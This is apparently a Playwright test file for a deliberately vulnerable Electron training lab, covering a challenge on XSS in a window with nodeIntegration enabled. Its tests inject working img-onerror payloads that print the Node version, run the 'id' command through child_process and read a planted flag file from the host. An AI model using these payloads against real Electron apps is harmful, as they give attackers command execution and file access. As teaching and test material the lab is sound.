// Behavioral test for Challenge 3 — Owned (What Can XSS Do in Electron?).
//
// Drives the REAL Electron app (via Playwright's `_electron`), same approach as Challenge 1/2's
// tests: exercises the actual injection sink, the actual dedicated window (nodeIntegration:
// true, no preload), and real require()-based Node/OS/file access directly in the renderer —
// not a mock of any of it. Asserts that Node access, command execution, and the host-file read
// are all genuine, not staged UI.
const fs = require('node:fs');
const path = require('node:path');
const { test, expect, _electron: electron } = require('@playwright/test');

const APP_DIR = path.resolve(__dirname, '..');
const ELECTRON_BIN = path.join(
  APP_DIR,
  'node_modules/electron/dist/electron' + (process.platform === 'win32' ? '.exe' : '')
);
const MAIN_JS_PATH = path.join(APP_DIR, 'src/main/main.js');
const RCE_SECRET_PATH = '/tmp/dvea-rce-flag.txt';

async function inject(win, payload) {
  await win.fill('#xssInput3', payload);
  await win.click('#xssForm3 button[type=submit]');
}

test.describe('Challenge 3 — Owned (XSS)', () => {
  let app;
  let mainWindow;
  let challengeWindow;

  test.beforeAll(async () => {
    app = await electron.launch({
      executablePath: ELECTRON_BIN,
      cwd: APP_DIR,
      args: [APP_DIR],
      // Some shells/CI runners export these for unrelated tooling; if set, Electron runs as
      // plain Node instead of launching the app, so force them off for this launch only.
      env: { ...process.env, ELECTRON_RUN_AS_NODE: '', ELECTRON_NO_ATTACH_CONSOLE: '' },
      timeout: 30_000,
    });

    mainWindow =
      app.windows().find((w) => w.url().includes('index.html')) ||
      (await app.waitForEvent('window', {
        predicate: (w) => w.url().includes('index.html'),
        timeout: 15_000,
      }));
    await mainWindow.waitForLoadState('domcontentloaded');

    const [challengeWin] = await Promise.all([
      app.waitForEvent('window', {
        predicate: (w) => w.url().includes('xss-rce-direct.html'),
        timeout: 15_000,
      }),
      mainWindow.evaluate(() => window.api.openXSSOwned()),
    ]);
    challengeWindow = challengeWin;

    await challengeWindow.waitForSelector('#badge-preload');
    // Main pushes window.__dveaWindowConfig / window.__dveaGroundTruth via executeJavaScript
    // after did-finish-load; wait for both so later tests aren't racing that push.
    await challengeWindow.waitForFunction(() => !!window.__dveaWindowConfig && !!window.__dveaGroundTruth, null, {
      timeout: 5_000,
    });
  });

  test.afterAll(async () => {
    await app?.close().catch(() => {});
    try {
      fs.unlinkSync(RCE_SECRET_PATH);
    } catch (err) {}
  });

  test('window genuinely has nodeIntegration on, no isolation, no sandbox, and no preload', async () => {
    // Anchor: assert what main.js actually DECLARES for this window (source-level intent) —
    // the classic cardinal-sin config. (Read from source rather than via app.evaluate():
    // Playwright's Electron evaluate() runs the callback as a bare eval, which has no
    // `require` in scope — there's no CommonJS module wrapper to provide it there.)
    const mainSrc = fs.readFileSync(MAIN_JS_PATH, 'utf8');
    const fnMatch = mainSrc.match(/function openXSSOwnedWindow\(\)[\s\S]*?\n  \}/);
    expect(fnMatch, 'openXSSOwnedWindow() not found in main.js').toBeTruthy();
    expect(fnMatch[0]).toMatch(/nodeIntegration:\s*true/);
    expect(fnMatch[0]).toMatch(/contextIsolation:\s*false/);
    expect(fnMatch[0]).toMatch(/sandbox:\s*false/);
    expect(fnMatch[0]).toMatch(/preload:\s*undefined/);

    // Effective: what Electron actually applied to this specific window, read straight from
    // the main process via the same getLastWebPreferences() API the Config Inspector uses.
    // Unlike Challenge 1/2's `sandbox: true`, none of these three depend on any OS-level
    // sandbox helper being available — they're pure JS-engine-level settings — so all three
    // are asserted strictly, with no environment-tolerant carve-out.
    const effective = await app.evaluate(({ webContents }, urlFragment) => {
      const wc = webContents.getAllWebContents().find((w) => w.getURL().includes(urlFragment));
      if (!wc) return null;
      const wp = wc.getLastWebPreferences() || {};
      return { sandbox: !!wp.sandbox, contextIsolation: !!wp.contextIsolation, nodeIntegration: !!wp.nodeIntegration };
    }, 'xss-rce-direct.html');

    expect(effective, 'could not find the challenge window webContents in the main process').toBeTruthy();
    expect(effective.sandbox).toBe(false);
    expect(effective.contextIsolation).toBe(false);
    expect(effective.nodeIntegration).toBe(true);

    // The badges must be a faithful VIEW of that same main-process data, whatever it says —
    // not hardcoded, and not independently (mis)measured in the renderer.
    const cfg = await challengeWindow.evaluate(() => window.__dveaWindowConfig);
    expect(cfg).toEqual(effective);

    await expect(challengeWindow.locator('#badge-sandbox')).toHaveText('✗ Sandbox: false');
    await expect(challengeWindow.locator('#badge-sandbox')).toHaveClass(/\bfail\b/);
    await expect(challengeWindow.locator('#badge-isolation')).toHaveText('✗ ContextIsolation: false');
    await expect(challengeWindow.locator('#badge-isolation')).toHaveClass(/\bfail\b/);

    // The headline badge for this challenge: red, and it's the one that actually matters.
    await expect(challengeWindow.locator('#badge-nodeintegration')).toHaveText('✗ NodeIntegration: true');
    await expect(challengeWindow.locator('#badge-nodeintegration')).toHaveClass(/\bfail\b/);

    // Unlike Challenge 2, no bridge was needed at all — this badge stays green, which is
    // itself part of the lesson (nodeIntegration alone is sufficient for full compromise).
    const hasBridge = await challengeWindow.evaluate(
      () => typeof window.api !== 'undefined' || typeof window.systemapi !== 'undefined'
    );
    expect(hasBridge).toBe(false);
    await expect(challengeWindow.locator('#badge-preload')).toHaveText('✓ Privileged bridge: false');
    await expect(challengeWindow.locator('#badge-preload')).toHaveClass(/\bpass\b/);

    // Confirm require() is genuinely reachable from this page's own main-world script (not
    // just claimed by the badges) — the actual mechanism this whole challenge depends on.
    const requireWorks = await challengeWindow.evaluate(() => typeof require === 'function');
    expect(requireWorks).toBe(true);
  });

  test('Task 1: proving Node access matches the real Node version main reported', async () => {
    const groundTruth = await challengeWindow.evaluate(() => window.__dveaGroundTruth);
    expect(groundTruth.nodeVersion).toMatch(/^\d+\.\d+\.\d+/);

    await inject(
      challengeWindow,
      `<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + process.versions.node + '</li>')">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText(groundTruth.nodeVersion);
    await expect(challengeWindow.locator('#task-1-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-1-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-1 .task-flag')).toContainText('DVEA{node_in_the_renderer}');
  });

  test('Task 2: real command execution matches the real `id` output main reported', async () => {
    const groundTruth = await challengeWindow.evaluate(() => window.__dveaGroundTruth);
    expect(groundTruth.whoami).toMatch(/uid=\d+/);

    await inject(
      challengeWindow,
      `<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + require('child_process').execSync('id').toString().trim() + '</li>')">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText(groundTruth.whoami);
    await expect(challengeWindow.locator('#task-2-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-2-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-2 .task-flag')).toContainText('DVEA{arbitrary_command_execution}');
  });

  test('Task 3: the exploit reads the real planted host file, independently verified', async () => {
    // Confirm the secret is a real file on disk before the exploit (not something the page
    // could see any other way) — this is what proves Task 3 is real host compromise, not
    // staged UI. Read it from the TEST's own Node process, independent of the app entirely.
    expect(fs.existsSync(RCE_SECRET_PATH), 'openXSSOwnedWindow should have planted the secret file').toBe(true);
    const realSecret = fs.readFileSync(RCE_SECRET_PATH, 'utf8').trim();
    expect(realSecret).toBe('DVEA{full_host_compromise}');

    await inject(
      challengeWindow,
      `<img src=x onerror="document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + require('fs').readFileSync('${RCE_SECRET_PATH}', 'utf8').replace(/\\n/g, ' ') + '</li>')">`
    );

    await expect(challengeWindow.locator('#attacker-log')).toContainText(realSecret);
    await expect(challengeWindow.locator('#task-3-status')).toHaveText('Solved');
    await expect(challengeWindow.locator('#task-3-status')).toHaveClass(/\bpass\b/);
    await expect(challengeWindow.locator('#task-3 .task-flag')).toContainText('DVEA{full_host_compromise}');
  });

  test('progress reaches 3 / 3 once all tasks are complete', async () => {
    await expect(challengeWindow.locator('#flag-progress')).toHaveText('(3 / 3 flags captured)');
  });
});
